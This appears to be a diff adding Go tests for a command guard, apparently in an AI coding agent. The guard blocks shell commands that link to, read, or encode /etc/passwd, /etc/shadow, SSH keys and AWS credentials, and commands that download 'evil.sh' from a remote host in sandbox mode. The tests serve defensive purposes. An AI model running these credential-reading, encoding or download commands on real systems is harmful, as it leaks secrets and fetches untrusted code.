@@ -615,3 +615,415 @@ func TestGuardReverseShellSocketCreate(t *testing.T) {
 		t.Fatal("expected php socket_create to be blocked")
 	}
 }
+
+// ---------------------------------------------------------------------------
+// 符号链接逃逸检测测试
+// ---------------------------------------------------------------------------
+
+// TestGuardSymlinkEscapeEtcPasswd verifies that creating a symlink to
+// /etc/passwd is blocked.
+func TestGuardSymlinkEscapeEtcPasswd(t *testing.T) {
+	payload := commandArguments{
+		Mode:       "shell",
+		RawCommand: "ln -s /etc/passwd /tmp/leaked_passwd",
+	}
+	cfg := internalconfig.Config{ApprovalMode: "auto"}
+	err := guardDangerousCommand(payload, cfg)
+	if err == nil {
+		t.Fatal("expected symlink to /etc/passwd to be blocked")
+	}
+	if !strings.Contains(err.Error(), "符号链接") {
+		t.Fatalf("expected symlink escape error, got: %v", err)
+	}
+}
+
+// TestGuardSymlinkEscapeSSHKey verifies that creating a symlink to SSH key
+// is blocked.
+func TestGuardSymlinkEscapeSSHKey(t *testing.T) {
+	payload := commandArguments{
+		Mode:       "shell",
+		RawCommand: "ln -s ~/.ssh/id_rsa /tmp/leaked_key",
+	}
+	cfg := internalconfig.Config{ApprovalMode: "auto"}
+	err := guardDangerousCommand(payload, cfg)
+	if err == nil {
+		t.Fatal("expected symlink to SSH key to be blocked")
+	}
+}
+
+// TestGuardSymlinkEscapeForceFlag verifies that ln -sf to a sensitive path
+// is blocked.
+func TestGuardSymlinkEscapeForceFlag(t *testing.T) {
+	payload := commandArguments{
+		Mode:       "shell",
+		RawCommand: "ln -sf /etc/shadow /tmp/leaked_shadow",
+	}
+	cfg := internalconfig.Config{ApprovalMode: "auto"}
+	err := guardDangerousCommand(payload, cfg)
+	if err == nil {
+		t.Fatal("expected ln -sf to /etc/shadow to be blocked")
+	}
+}
+
+// TestGuardSymlinkEscapeAWSCredentials verifies that creating a symlink to
+// AWS credentials is blocked.
+func TestGuardSymlinkEscapeAWSCredentials(t *testing.T) {
+	payload := commandArguments{
+		Mode:       "shell",
+		RawCommand: "ln -s ~/.aws/credentials /tmp/leaked_aws",
+	}
+	cfg := internalconfig.Config{ApprovalMode: "auto"}
+	err := guardDangerousCommand(payload, cfg)
+	if err == nil {
+		t.Fatal("expected symlink to AWS credentials to be blocked")
+	}
+}
+
+// TestGuardSymlinkEscapeSafeLink verifies that creating a symlink to a
+// non-sensitive path is not blocked.
+func TestGuardSymlinkEscapeSafeLink(t *testing.T) {
+	payload := commandArguments{
+		Mode:       "shell",
+		RawCommand: "ln -s /tmp/source.txt /tmp/link.txt",
+	}
+	cfg := internalconfig.Config{ApprovalMode: "auto"}
+	err := guardDangerousCommand(payload, cfg)
+	if err != nil {
+		t.Fatalf("expected safe symlink to pass, got: %v", err)
+	}
+}
+
+// TestGuardSymlinkEscapeAllowedInNonAutoMode verifies that symlink escape
+// is not blocked when approval mode is not "auto".
+func TestGuardSymlinkEscapeAllowedInNonAutoMode(t *testing.T) {
+	payload := commandArguments{
+		Mode:       "shell",
+		RawCommand: "ln -s /etc/passwd /tmp/leaked",
+	}
+	cfg := internalconfig.Config{ApprovalMode: "readonly"}
+	err := guardDangerousCommand(payload, cfg)
+	if err != nil {
+		t.Fatalf("expected no error in non-auto mode, got: %v", err)
+	}
+}
+
+// ---------------------------------------------------------------------------
+// 脚本语言复制敏感文件检测测试
+// ---------------------------------------------------------------------------
+
+// TestGuardScriptSensitiveAccessPythonOpen verifies that using Python to
+// open /etc/passwd is blocked.
+func TestGuardScriptSensitiveAccessPythonOpen(t *testing.T) {
+	payload := commandArguments{
+		Mode:       "shell",
+		RawCommand: "python3 -c 'open(\"/etc/passwd\").read()'",
+	}
+	cfg := internalconfig.Config{ApprovalMode: "auto"}
+	err := guardDangerousCommand(payload, cfg)
+	if err == nil {
+		t.Fatal("expected python open(/etc/passwd) to be blocked")
+	}
+	if !strings.Contains(err.Error(), "脚本语言") {
+		t.Fatalf("expected script access error, got: %v", err)
+	}
+}
+
+// TestGuardScriptSensitiveAccessPythonSSHKey verifies that using Python to
+// read SSH key is blocked.
+func TestGuardScriptSensitiveAccessPythonSSHKey(t *testing.T) {
+	payload := commandArguments{
+		Mode:       "shell",
+		RawCommand: "python3 -c 'open(\"~/.ssh/id_rsa\").read()'",
+	}
+	cfg := internalconfig.Config{ApprovalMode: "auto"}
+	err := guardDangerousCommand(payload, cfg)
+	if err == nil {
+		t.Fatal("expected python open(~/.ssh/id_rsa) to be blocked")
+	}
+}
+
+// TestGuardScriptSensitiveAccessPythonShutil verifies that using Python
+// shutil.copy to copy sensitive file is blocked.
+func TestGuardScriptSensitiveAccessPythonShutil(t *testing.T) {
+	payload := commandArguments{
+		Mode:       "shell",
+		RawCommand: "python3 -c 'import shutil; shutil.copy(\"/etc/passwd\", \"/tmp/leaked\")'",
+	}
+	cfg := internalconfig.Config{ApprovalMode: "auto"}
+	err := guardDangerousCommand(payload, cfg)
+	if err == nil {
+		t.Fatal("expected python shutil.copy to be blocked")
+	}
+}
+
+// TestGuardScriptSensitiveAccessPerlOpen verifies that using Perl to open
+// /etc/shadow is blocked.
+func TestGuardScriptSensitiveAccessPerlOpen(t *testing.T) {
+	payload := commandArguments{
+		Mode:       "shell",
+		RawCommand: "perl -e 'open(my $fh, \"<\", \"/etc/shadow\")'",
+	}
+	cfg := internalconfig.Config{ApprovalMode: "auto"}
+	err := guardDangerousCommand(payload, cfg)
+	if err == nil {
+		t.Fatal("expected perl open(/etc/shadow) to be blocked")
+	}
+}
+
+// TestGuardScriptSensitiveAccessRubyFileOpen verifies that using Ruby
+// File.open to read sensitive file is blocked.
+func TestGuardScriptSensitiveAccessRubyFileOpen(t *testing.T) {
+	payload := commandArguments{
+		Mode:       "shell",
+		RawCommand: "ruby -e 'File.open(\"/etc/passwd\").read'",
+	}
+	cfg := internalconfig.Config{ApprovalMode: "auto"}
+	err := guardDangerousCommand(payload, cfg)
+	if err == nil {
+		t.Fatal("expected ruby File.open to be blocked")
+	}
+}
+
+// TestGuardScriptSensitiveAccessNodeFs verifies that using Node.js fs
+// to read sensitive file is blocked.
+func TestGuardScriptSensitiveAccessNodeFs(t *testing.T) {
+	payload := commandArguments{
+		Mode:       "shell",
+		RawCommand: "node -e 'require(\"fs\").readFileSync(\"/etc/passwd\")'",
+	}
+	cfg := internalconfig.Config{ApprovalMode: "auto"}
+	err := guardDangerousCommand(payload, cfg)
+	if err == nil {
+		t.Fatal("expected node fs.readFileSync to be blocked")
+	}
+}
+
+// TestGuardScriptSensitiveAccessPHPFopen verifies that using PHP fopen
+// to read sensitive file is blocked.
+func TestGuardScriptSensitiveAccessPHPFopen(t *testing.T) {
+	payload := commandArguments{
+		Mode:       "shell",
+		RawCommand: "php -r 'fopen(\"/etc/shadow\", \"r\")'",
+	}
+	cfg := internalconfig.Config{ApprovalMode: "auto"}
+	err := guardDangerousCommand(payload, cfg)
+	if err == nil {
+		t.Fatal("expected php fopen to be blocked")
+	}
+}
+
+// TestGuardScriptSensitiveAccessSafeScript verifies that a safe Python
+// script is not blocked.
+func TestGuardScriptSensitiveAccessSafeScript(t *testing.T) {
+	payload := commandArguments{
+		Mode:       "shell",
+		RawCommand: "python3 -c 'print(\"hello world\")'",
+	}
+	cfg := internalconfig.Config{ApprovalMode: "auto"}
+	err := guardDangerousCommand(payload, cfg)
+	if err != nil {
+		t.Fatalf("expected safe python script to pass, got: %v", err)
+	}
+}
+
+// TestGuardScriptSensitiveAccessSafeFileRead verifies that reading a
+// non-sensitive file via Python is not blocked.
+func TestGuardScriptSensitiveAccessSafeFileRead(t *testing.T) {
+	payload := commandArguments{
+		Mode:       "shell",
+		RawCommand: "python3 -c 'open(\"/tmp/hello.txt\").read()'",
+	}
+	cfg := internalconfig.Config{ApprovalMode: "auto"}
+	err := guardDangerousCommand(payload, cfg)
+	if err != nil {
+		t.Fatalf("expected safe file read to pass, got: %v", err)
+	}
+}
+
+// ---------------------------------------------------------------------------
+// Base64 编码绕过防护测试
+// ---------------------------------------------------------------------------
+
+// TestGuardBase64BypassDirect verifies that base64 /etc/passwd is blocked.
+func TestGuardBase64BypassDirect(t *testing.T) {
+	payload := commandArguments{
+		Mode:       "shell",
+		RawCommand: "base64 /etc/passwd",
+	}
+	cfg := internalconfig.Config{ApprovalMode: "auto"}
+	err := guardDangerousCommand(payload, cfg)
+	if err == nil {
+		t.Fatal("expected base64 /etc/passwd to be blocked")
+	}
+}
+
+// TestGuardBase64BypassPipe verifies that cat /etc/passwd | base64 is blocked.
+func TestGuardBase64BypassPipe(t *testing.T) {
+	payload := commandArguments{
+		Mode:       "shell",
+		RawCommand: "cat /etc/passwd | base64",
+	}
+	cfg := internalconfig.Config{ApprovalMode: "auto"}
+	err := guardDangerousCommand(payload, cfg)
+	if err == nil {
+		t.Fatal("expected cat /etc/passwd | base64 to be blocked")
+	}
+}
+
+// TestGuardBase64BypassSSHKey verifies that base64 encoding of SSH key
+// is blocked.
+func TestGuardBase64BypassSSHKey(t *testing.T) {
+	payload := commandArguments{
+		Mode:       "shell",
+		RawCommand: "base64 ~/.ssh/id_rsa",
+	}
+	cfg := internalconfig.Config{ApprovalMode: "auto"}
+	err := guardDangerousCommand(payload, cfg)
+	if err == nil {
+		t.Fatal("expected base64 ~/.ssh/id_rsa to be blocked")
+	}
+}
+
+// TestGuardBase64BypassXxd verifies that cat /etc/shadow | xxd is blocked.
+func TestGuardBase64BypassXxd(t *testing.T) {
+	payload := commandArguments{
+		Mode:       "shell",
+		RawCommand: "cat /etc/shadow | xxd",
+	}
+	cfg := internalconfig.Config{ApprovalMode: "auto"}
+	err := guardDangerousCommand(payload, cfg)
+	if err == nil {
+		t.Fatal("expected cat /etc/shadow | xxd to be blocked")
+	}
+}
+
+// TestGuardBase64BypassHexdump verifies that cat /etc/passwd | hexdump is blocked.
+func TestGuardBase64BypassHexdump(t *testing.T) {
+	payload := commandArguments{
+		Mode:       "shell",
+		RawCommand: "cat /etc/passwd | hexdump -C",
+	}
+	cfg := internalconfig.Config{ApprovalMode: "auto"}
+	err := guardDangerousCommand(payload, cfg)
+	if err == nil {
+		t.Fatal("expected cat /etc/passwd | hexdump to be blocked")
+	}
+}
+
+// TestGuardBase64BypassOpenssl verifies that openssl base64 encoding of
+// sensitive file is blocked.
+func TestGuardBase64BypassOpenssl(t *testing.T) {
+	payload := commandArguments{
+		Mode:       "shell",
+		RawCommand: "cat /etc/passwd | openssl base64",
+	}
+	cfg := internalconfig.Config{ApprovalMode: "auto"}
+	err := guardDangerousCommand(payload, cfg)
+	if err == nil {
+		t.Fatal("expected cat /etc/passwd | openssl base64 to be blocked")
+	}
+}
+
+// TestGuardBase64BypassSafeFile verifies that base64 encoding of a
+// non-sensitive file is not blocked.
+func TestGuardBase64BypassSafeFile(t *testing.T) {
+	payload := commandArguments{
+		Mode:       "shell",
+		RawCommand: "base64 /tmp/hello.txt",
+	}
+	cfg := internalconfig.Config{ApprovalMode: "auto"}
+	err := guardDangerousCommand(payload, cfg)
+	if err != nil {
+		t.Fatalf("expected safe base64 to pass, got: %v", err)
+	}
+}
+
+// ---------------------------------------------------------------------------
+// 沙盒模式下下载外部文件拦截测试
+// ---------------------------------------------------------------------------
+
+// TestGuardNetworkDownloadCurl verifies that curl download is blocked
+// when sandbox is enabled.
+func TestGuardNetworkDownloadCurl(t *testing.T) {
+	payload := commandArguments{
+		Mode:       "shell",
+		RawCommand: "curl -o /tmp/evil.sh http://10.0.0.1/evil.sh",
+	}
+	cfg := internalconfig.Config{ApprovalMode: "auto", ShellSandboxMode: "auto"}
+	err := guardDangerousCommand(payload, cfg)
+	if err == nil {
+		t.Fatal("expected curl download to be blocked in sandbox mode")
+	}
+	if !strings.Contains(err.Error(), "下载外部文件") {
+		t.Fatalf("expected download error, got: %v", err)
+	}
+}
+
+// TestGuardNetworkDownloadWget verifies that wget download is blocked
+// when sandbox is enabled.
+func TestGuardNetworkDownloadWget(t *testing.T) {
+	payload := commandArguments{
+		Mode:       "shell",
+		RawCommand: "wget http://10.0.0.1/evil.sh -O /tmp/evil.sh",
+	}
+	cfg := internalconfig.Config{ApprovalMode: "auto", ShellSandboxMode: "enforce"}
+	err := guardDangerousCommand(payload, cfg)
+	if err == nil {
+		t.Fatal("expected wget download to be blocked in sandbox mode")
+	}
+}
+
+// TestGuardNetworkDownloadScp verifies that scp is blocked when sandbox
+// is enabled.
+func TestNetworkDownloadScp(t *testing.T) {
+	payload := commandArguments{
+		Mode:       "shell",
+		RawCommand: "scp user@10.0.0.1:/tmp/evil.sh /tmp/evil.sh",
+	}
+	cfg := internalconfig.Config{ApprovalMode: "auto", ShellSandboxMode: "auto"}
+	err := guardDangerousCommand(payload, cfg)
+	if err == nil {
+		t.Fatal("expected scp to be blocked in sandbox mode")
+	}
+}
+
+// TestGuardNetworkDownloadAria2c verifies that aria2c download is blocked.
+func TestGuardNetworkDownloadAria2c(t *testing.T) {
+	payload := commandArguments{
+		Mode:       "shell",
+		RawCommand: "aria2c http://10.0.0.1/evil.sh",
+	}
+	cfg := internalconfig.Config{ApprovalMode: "auto", ShellSandboxMode: "auto"}
+	err := guardDangerousCommand(payload, cfg)
+	if err == nil {
+		t.Fatal("expected aria2c to be blocked in sandbox mode")
+	}
+}
+
+// TestGuardNetworkDownloadAllowedWhenSandboxOff verifies that download
+// commands are not blocked when sandbox is off.
+func TestGuardNetworkDownloadAllowedWhenSandboxOff(t *testing.T) {
+	payload := commandArguments{
+		Mode:       "shell",
+		RawCommand: "curl -o /tmp/file.txt http://example.com/file.txt",
+	}
+	cfg := internalconfig.Config{ApprovalMode: "auto", ShellSandboxMode: "off"}
+	err := guardDangerousCommand(payload, cfg)
+	if err != nil {
+		t.Fatalf("expected download to pass when sandbox is off, got: %v", err)
+	}
+}
+
+// TestGuardNetworkDownloadSafeCurl verifies that curl without -o (just
+// fetching content) is not blocked.
+func TestGuardNetworkDownloadSafeCurl(t *testing.T) {
+	payload := commandArguments{
+		Mode:       "shell",
+		RawCommand: "curl https://example.com/api",
+	}
+	cfg := internalconfig.Config{ApprovalMode: "auto", ShellSandboxMode: "auto"}
+	err := guardDangerousCommand(payload, cfg)
+	if err != nil {
+		t.Fatalf("expected safe curl to pass, got: %v", err)
+	}
+}
